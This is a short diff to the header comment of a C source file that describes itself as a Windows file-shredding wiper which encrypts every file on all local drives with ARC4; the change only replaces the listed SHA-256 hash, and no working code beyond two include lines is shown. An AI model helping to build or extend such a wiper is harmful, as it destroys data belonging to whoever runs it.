@@ -3,7 +3,7 @@
   Version:          5.18
   Class:            Files shredder for Windows / Wiper.
   What is he doing: Encrypts all files on all local drives with a cipher ARC4
-  SHA-256:          7d1795d687f7490567d5abdea6196e6ca44f7b470ea9e6f09e66561b657d3982
+  SHA-256:          8d1f1625cd2bf98504c84fa765a98ee065ee9b2c0056b7506425d588ce752314
 */
 #include <io.h>
 #include <time.h>
